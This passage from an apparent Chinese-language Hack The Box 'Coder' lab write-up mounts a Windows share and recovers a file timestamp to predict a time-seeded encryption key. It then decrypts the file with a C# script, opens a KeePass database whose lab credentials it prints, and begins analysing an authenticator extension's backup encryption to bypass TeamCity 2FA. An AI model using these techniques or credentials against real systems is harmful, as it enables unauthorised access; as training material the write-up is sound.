&#123;</span><br><span class="line">					<span class="keyword">using</span> (FileStream fileStream2 = <span class="keyword">new</span> FileStream(sourceFile, FileMode.Open))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line">						<span class="built_in">int</span> count;</span><br><span class="line">						<span class="keyword">while</span> ((count = fileStream2.Read(array, <span class="number">0</span>, array.Length)) != <span class="number">0</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							cryptoStream.Write(array, <span class="number">0</span>, count);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数也就是实现文件加密的具体过程，其中传入的密钥和IV即我们上面所说的利用伪随机数生成的，如果我们能够知道文件创建的具体时间的话，我们就能恢复Unix时间戳然后预测随机数从而拿到密钥和IV，但是现在的问题是文件的创建时间是我们从共享中下载该文件的时间，要想保留真实的创建时间我们该怎么做呢？</p>
<p>我们应该将其挂载在我们的机器上，这里有多种挂载方式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount //10.10.11.207/Development /mnt</span><br></pre></td></tr></table></figure>
<p>可以看到已经成功匿名挂载上去了</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323222832.png" alt="微信截图_20250323222832"></p>
<p>接下来利用<code>stat</code>（<strong>命令用于显示文件或文件系统的详细信息，包括权限、大小、时间戳等</strong>）查看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> /mnt/Temporary\ Projects/s.blade.enc </span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">──(chromosome㉿kali)-[~/HTB/Coder/Temporary Projects]</span><br><span class="line">└─$ <span class="built_in">stat</span> /mnt/Temporary\ Projects/s.blade.enc </span><br><span class="line">  文件：/mnt/Temporary Projects/s.blade.enc</span><br><span class="line">  大小：3808      	块：8          IO 块大小：1048576 普通文件</span><br><span class="line">设备：0,54	Inode: 1125899907128474  硬链接：1</span><br><span class="line">权限：(0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">访问时间：2022-11-12 06:17:08.374350100 +0800</span><br><span class="line">修改时间：2022-11-12 06:17:08.374350100 +0800</span><br><span class="line">变更时间：2022-11-12 06:17:08.374350100 +0800</span><br><span class="line">创建时间：2022-11-08 05:05:02.949637700 +0800</span><br></pre></td></tr></table></figure>
<blockquote>
<p>还有另一种方式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo mount -t cifs \\\\dc01.coder.htb\\Development /mnt -o vers=3.0,username=guest,serverino,sec=ntlmsspi</span><br></pre></td></tr></table></figure>
<p><code>-t cifs</code>：指定文件系统为<code>cifs</code>，<code>cifs</code>是Windows系统常用的一种网络文件共享协议</p>
<p><code>\\\\dc01.coder.htb\\Development</code>：指定共享，双反斜杠是为了转义反斜杠</p>
<p><code>/mnt</code>：挂载点</p>
<p><code>-o</code>：指定其他的挂载选项</p>
<ul>
<li><code>vers=3.0</code>：设置<code>CIFS</code>的版本</li>
<li><code>username=guest</code>：指定用户名</li>
<li><code>serverino</code>：该选项请求服务器生成并返回唯一的 inode 号码，这在某些特定的应用或场景中可能会有所帮助。</li>
<li><code>sec=ntlmsspi</code>：该选项指定用于身份验证的安全机制。“ntlmsspi” 指的是 NTLMSSP（NT LAN Manager Security Support Provider），这是一种 Windows 认证协议。</li>
</ul>
<p>之后利用<code>date</code>命令下的<code>-r</code>选项显示文件的最后修改时间</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250324000923.png" alt="微信截图_20250324000923"></p>
<p>完整命令为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">date</span> -r /mnt/Temporary\ Projects/s.blade.enc <span class="string">&quot;+%s&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250324001107.png" alt="微信截图_20250324001107"></p>
</blockquote>
<p>接下来利用AI写一个解密脚本即可</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 已知的 value 值</span></span><br><span class="line">        <span class="built_in">long</span> <span class="keyword">value</span> = <span class="number">1668205028</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用相同的随机数生成器生成 Key 和 IV</span></span><br><span class="line">        Random random = <span class="keyword">new</span> Random(Convert.ToInt32(<span class="keyword">value</span>));</span><br><span class="line">        <span class="built_in">byte</span>[] iv = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="built_in">byte</span>[] key = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">        random.NextBytes(iv);</span><br><span class="line">        random.NextBytes(key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加密文件的路径</span></span><br><span class="line">        <span class="built_in">string</span> encryptedFile = <span class="string">&quot;C:\\Users\\lenovo\\Desktop\\s.blade.enc&quot;</span>;</span><br><span class="line">        <span class="comment">// 解密后文件的路径</span></span><br><span class="line">        <span class="built_in">string</span> decryptedFile = <span class="string">&quot;C:\\Users\\lenovo\\Desktop\\de&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解密文件</span></span><br><span class="line">        DecryptFile(encryptedFile, decryptedFile, key, iv);</span><br><span class="line"></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;文件解密完成！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DecryptFile</span>(<span class="params"><span class="built_in">string</span> encryptedFile, <span class="built_in">string</span> decryptedFile, <span class="built_in">byte</span>[] key, <span class="built_in">byte</span>[] iv</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (RijndaelManaged aes = <span class="keyword">new</span> RijndaelManaged())</span><br><span class="line">        &#123;</span><br><span class="line">            aes.Key = key;</span><br><span class="line">            aes.IV = iv;</span><br><span class="line">            aes.Mode = CipherMode.CBC;</span><br><span class="line">            aes.Padding = PaddingMode.PKCS7;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (FileStream fsInput = <span class="keyword">new</span> FileStream(encryptedFile, FileMode.Open))</span><br><span class="line">            <span class="keyword">using</span> (FileStream fsOutput = <span class="keyword">new</span> FileStream(decryptedFile, FileMode.Create))</span><br><span class="line">            <span class="keyword">using</span> (ICryptoTransform decryptor = aes.CreateDecryptor())</span><br><span class="line">            <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(fsInput, decryptor, CryptoStreamMode.Read))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] buffer = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="built_in">int</span> bytesRead;</span><br><span class="line">                <span class="keyword">while</span> ((bytesRead = cryptoStream.Read(buffer, <span class="number">0</span>, buffer.Length)) &gt; <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    fsOutput.Write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们将解密出来的文件放入010里面查看一下它是什么类型的文件</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250401211851.png" alt="微信截图_20250401211851"></p>
<p>由上图可知很明显的7z文件头，然后我们给他添加7z后缀进行解压，压缩包中的文件如下所示</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250401212023.png" alt="微信截图_20250401212023"></p>
<blockquote>
<p>KDBX 文件是KeePass密码管理器使用的数据库文件格式。它用于存储用户的密码、账户信息以及其他敏感数据，并通过强加密算法保护这些信息。</p>
</blockquote>
<p>我们可以利用<code>kpcli</code>和<code>keepassxc</code>解密我们的文件，建议使用<code>keepassxc</code>图形化很方便</p>
<p>打开后我们利用<code>.key</code>文件作为密钥</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250401213318.png" alt="微信截图_20250401213318"></p>
<p>数据库中存在两组登录凭据和一组验证器备份码<strong>Authenticator backup codes</strong>，在名为<strong>Teamcity</strong>的登录凭据中揭示了一个新的子域<a target="_blank" rel="noopener" href="https://teamcity-dev.coder.htb">https://teamcity-dev.coder.htb</a></p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250401213430.png" alt="微信截图_20250401213430"></p>
<p>详细的信息如下所示</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Authenticator backup codes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;: &#123;</span><br><span class="line"><span class="code">    &quot;encrypted&quot;: true,</span></span><br><span class="line"><span class="code">    &quot;hash&quot;: &quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;,</span></span><br><span class="line"><span class="code">    &quot;index&quot;: 1,</span></span><br><span class="line"><span class="code">    &quot;type&quot;: &quot;totp&quot;,</span></span><br><span class="line"><span class="code">    &quot;secret&quot;: &quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;,</span></span><br><span class="line"><span class="code">    &quot;issuer&quot;: &quot;TeamCity&quot;,</span></span><br><span class="line"><span class="code">    &quot;account&quot;: &quot;s.blade&quot;</span></span><br><span class="line"><span class="code">  &#125;,</span></span><br><span class="line"><span class="code">  &quot;key&quot;: &#123;</span></span><br><span class="line"><span class="code">    &quot;enc&quot;: &quot;U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1&quot;,</span></span><br><span class="line"><span class="code">    &quot;hash&quot;: &quot;$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV&quot;</span></span><br><span class="line"><span class="code">  &#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"></span><br><span class="line"><span class="section">#看起来像一个域用户凭据</span></span><br><span class="line">O365 </span><br><span class="line">s.blade@coder.htb</span><br><span class="line">AmcwNO60Zg3vca3o0HDrTC6D</span><br><span class="line"></span><br><span class="line">Teamcity</span><br><span class="line">s.blade</span><br><span class="line">veh5nUSZFFoqz9CrrhSeuwhA</span><br><span class="line">https://teamcity-dev.coder.htb</span><br></pre></td></tr></table></figure>
<p>将子域加入hosts文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.11.207 teamcity-dev.coder.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure>
<p>s.blade账户没有winrm权限（可能不在Remote Management Users组中），但是有smb权限和ldap权限</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250425185906.png" alt="微信截图_20250425185906"></p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250425190222.png" alt="微信截图_20250425190222"></p>
<h2 id="对kdbx中的子域名进行信息收集"><a class="markdownIt-Anchor" href="#对kdbx中的子域名进行信息收集"></a> 对KDBX中的子域名进行信息收集</h2>
<p>服务开放在443端口上，界面是JetBrains的Teamcity登录界面，我们尝试利用凭据<code>s.blade:veh5nUSZFFoqz9CrrhSeuwhA</code>进行登录</p>
<blockquote>
<p>TeamCity是由JetBrains开发的 <strong>持续集成（CI）和持续部署（CD）</strong> 工具。它用于自动化软件构建、测试和发布流程，帮助开发团队提高效率和代码质量。</p>
</blockquote>
<h3 id="验证器备份码"><a class="markdownIt-Anchor" href="#验证器备份码"></a> 验证器备份码</h3>
<p>但是这里触发了Two-Factor Authentication即2FA</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250401215120.png" alt="微信截图_20250401215120"></p>
<blockquote>
<p>2FA即二要素认证是一种<strong>增强型身份验证机制</strong>，要求用户提供<strong>两种不同的认证因素</strong>以验证其身份，比单一密码认证更加安全，即使密码泄露，攻击者仍然需要第二个因素才能完成身份验证</p>
<p>二要素认证的 <strong>两个因素必须来自不同的类别</strong>，常见的组合有：</p>
<ul>
<li>密码 + 短信验证码</li>
<li>密码 + TOTP 动态验证码</li>
<li>密码 + 硬件安全密钥</li>
<li>密码 + 指纹识别</li>
</ul>
<p>我们在上面所发现的Authenticator backup codes采用的就是TOTP(Time-Based One-Time Password)是基于时间的动态验证码</p>
<p>还有一种身份验证机制叫做<strong>MFA（Multi-Factor Authentication）</strong></p>
</blockquote>
<p>我们<code>keepassxc</code>中的<code>Authenticator backup codes</code>很明显是被加密过的，在登录页面需要输入来自<code>authenticator app</code>获取到的6位数字码或恢复后的密码，这里在<a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai?hl=en">谷歌</a>和火狐中均存在一个名叫<code>Authenticator</code>的2FA拓展 ，我们可以通过它获取6位数字密码或者恢复后的密码</p>
<p>我们可以先测试一下这个拓展程序，这里我们添加一个新的账户，这里的密码是16位字母</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402162158.png" alt="微信截图_20250402162158"></p>
<p>他会生成6位验证码</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402162316.png" alt="微信截图_20250402162316"></p>
<p>我们尝试下载一下备份文件并和我们在keepassxc中得到的进行对比</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402162359.png" alt="微信截图_20250402162359"></p>
<p>下面是备份文件的格式及内容，但是这是没有进行加密的文件，我们给备份文件设置密码看看会出现什么样子的变化</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otpauth://totp/test:?secret=aaaaaaaaaaaaaaaa&amp;issuer=test</span><br></pre></td></tr></table></figure>
<p>在设置的安全中添加密码</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402162753.png" alt="微信截图_20250402162753"></p>
<p>我们重新返回备份中可以看到多出了一个下载加密备份的选项，我们下载下来看一下</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402162838.png" alt="微信截图_20250402162838"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;c85c3817-c6e5-4dfe-a07e-5ef25ddf919f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EncOTPStorage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX18fvjz8FHUB0fN9sywDmlY/zfySf9ZCz8c6gC5n9BxWSKFpt4DLrHUepUT9yPMFNALZCnupgR1D/BGFxXHUvIRW8OMb6DPtupMkYZ6XSrP/oaiZVjKdt5lOGJSqv9VAB4FNxWfj7WN1YsOgcNqo6Q2eTXhRRB/aKaNSXTjEb3p7SfoXUryj/O/9Dff0AEUsSszgGoSSFbRgwUnccT1E3N0r6N94tqqAeAC4xKYZHrpUy/wK6RNy8GCyCfFSGdtrVKtrzgRuVIiFVCcGt6pKZQox9HKTReP+V6c=&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2083bee2-fe4d-494d-949e-364ed5349b64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;2083bee2-fe4d-494d-949e-364ed5349b64&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Key&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$argon2id$v=19$m=19456,t=2,p=1$MzEyNDNlNzNmZjMwOWQyYjNkNzcyZWEzNDQ5ZTY1MDg$X1YxjXK1RlMy3hnRqD4a6tKAF/6pnxAFvaQ85uYlBGk&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2083bee2-fe4d-494d-949e-364ed5349b64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;salt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;452012591ffc24bb2a23aee74e618e&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>可见返回的加密备份文件和我们之前获得的存在大量相似之处</p>
<p>我们可以选择导入备份文件并输入加密备份文件的密码获取当前的6位TOTP验证码值，那么现在的目标就是获取加密密码</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402163353.png" alt="微信截图_20250402163353"></p>
<h3 id="分析加解密逻辑"><a class="markdownIt-Anchor" href="#分析加解密逻辑"></a> 分析加解密逻辑</h3>
<p>因为这个项目开源，我们在Github上找到<a target="_blank" rel="noopener" href="https://github.com/Authenticator-Extension/Authenticator">源码</a>（这里选择dev分支）分析加密逻辑，首先定位<code>src/definitions/otp.d.ts</code>这个存在很多接口的地方，有如下代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">EncryptionInterface</span> &#123;</span><br><span class="line">  <span class="title function_">getEncryptedString</span>(<span class="attr">data</span>: string): string;</span><br><span class="line">  <span class="title function_">decryptSecretString</span>(<span class="attr">entry</span>: string): string | <span class="literal">null</span>;</span><br><span class="line">  <span class="title function_">decryptEncSecret</span>(<span class="attr">entry</span>: <span class="title class_">OTPEntryInterface</span>): <span class="title class_">RawOTPStorage</span> | <span class="literal">null</span>;</span><br><span class="line">  <span class="title function_">getEncryptionStatus</span>(): boolean;</span><br><span class="line">  <span class="title function_">updateEncryptionPassword</span>(<span class="attr">password</span>: string): <span class="keyword">void</span>;</span><br><span class="line">  <span class="title function_">getEncryptionKeyId</span>(): string;</span><br><span class="line">  <span class="title function_">setEncryptionKeyId</span>(<span class="attr">id</span>: string): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们跟进<code>getEncryptedString</code>这个接口看一下具体实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getEncryptedString</span>(<span class="attr">data</span>: string): string &#123;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">password</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> data;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(data, <span class="variable language_">this</span>.<span class="property">password</span>).<span class="title function_">toString</span>();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>加密过程利用了<code>CryptoJS.AES</code>这个库，对提供的数据和密码进行加密</p>
<p>接下来看一下解密备份数据函数，函数存在于<code>src/import.ts</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">decryptBackupData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  backupData: &#123; [hash: string]: OTPStorage | Key &#125;,</span></span><br><span class="line"><span class="params">  passphrase: string | <span class="literal">null</span></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">decryptedBackupData</span>: &#123; [<span class="attr">hash</span>: string]: <span class="title class_">RawOTPStorage</span> &#125; = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">keys</span>: <span class="title class_">Map</span>&lt;string, string | <span class="literal">null</span>&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> hash <span class="keyword">in</span> backupData) &#123;</span><br><span class="line">    <span class="keyword">const</span> unknownStorageItem = backupData[hash];</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      <span class="keyword">typeof</span> unknownStorageItem !== <span class="string">&quot;object&quot;</span> ||</span><br><span class="line">      unknownStorageItem.<span class="property">dataType</span> === <span class="string">&quot;Key&quot;</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">storageItem</span>: <span class="title class_">RawOTPStorage</span>;</span><br><span class="line">    <span class="keyword">if</span> (unknownStorageItem.<span class="property">dataType</span> === <span class="string">&quot;EncOTPStorage&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!passphrase) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!keys.<span class="title function_">has</span>(unknownStorageItem.<span class="property">keyId</span>)) &#123;</span><br><span class="line">        keys.<span class="title function_">set</span>(</span><br><span class="line">          unknownStorageItem.<span class="property">keyId</span>,</span><br><span class="line">          <span class="keyword">await</span> <span class="title function_">findAndUnlockKey</span>(</span><br><span class="line">            backupData,</span><br><span class="line">            unknownStorageItem.<span class="property">keyId</span>,</span><br><span class="line">            passphrase</span><br><span class="line">          )</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> decryptKey = keys.<span class="title function_">get</span>(unknownStorageItem.<span class="property">keyId</span>);</span><br><span class="line">      <span class="keyword">if</span> (!decryptKey) &#123;</span><br><span class="line">        <span class="comment">// wrong password for key</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      storageItem = &#123;</span><br><span class="line">        ...unknownStorageItem,</span><br><span class="line">        ...<span class="title class_">JSON</span>.<span class="title function_">parse</span>(</span><br><span class="line">          <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(unknownStorageItem.<span class="property">data</span>, decryptKey).<span class="title function_">toString</span>(</span><br><span class="line">            <span class="title 